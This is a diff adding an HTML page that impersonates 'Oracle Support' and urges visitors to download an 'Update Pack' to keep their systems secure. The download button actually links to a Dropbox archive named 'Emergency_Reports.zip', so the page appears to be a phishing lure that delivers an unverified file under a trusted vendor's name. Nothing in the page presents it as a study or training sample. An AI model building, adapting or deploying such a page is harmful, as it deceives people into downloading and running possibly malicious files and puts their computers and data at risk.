@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oracle Support - Update Pack</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #f5f6f5 0%, #e5e7e5 100%);
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 800px;
+            padding: 40px 20px;
+            text-align: center;
+        }
+        .header {
+            margin-bottom: 40px;
+        }
+        .header h1 {
+            font-size: 2.5em;
+            color: #c41230;
+            margin-bottom: 10px;
+        }
+        .description {
+            font-size: 1.2em;
+            line-height: 1.6;
+            color: #555;
+            margin-bottom: 30px;
+        }
+        .download-button {
+            display: inline-block;
+            padding: 15px 30px;
+            font-size: 1.1em;
+            font-weight: 700;
+            color: #fff;
+            background-color: #c41230;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+        .download-button:hover {
+            background-color: #a30f27;
+            transform: translateY(-2px);
+        }
+        .download-button:active {
+            transform: translateY(0);
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 0.9em;
+            color: #777;
+        }
+        @media (max-width: 600px) {
+            .header h1 {
+                font-size: 2em;
+            }
+            .description {
+                font-size: 1em;
+            }
+            .download-button {
+                padding: 12px 25px;
+                font-size: 1em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Oracle Support</h1>
+        </div>
+        <div class="description">
+            <p>Download the latest <strong>Update Pack</strong> to ensure your system remains secure and up to date. Please apply the update as soon as possible for optimal performance and stability.</p>
+        </div>
+        <a href="https://www.dropbox.com/scl/fi/bcjhicy6yvopuijlhvwq3/Emergency_Reports.zip?rlkey=1rz5ckw43yq2wsdo8n1zdtp12&st=3vav3rpq&dl=1" class="download-button">Download Update Pack</a>
+
+        <div class="footer">
+            <p>&copy; 2025 Oracle Support. All rights reserved.</p>
+        </div>
+    </div>
+</body>
+</html>
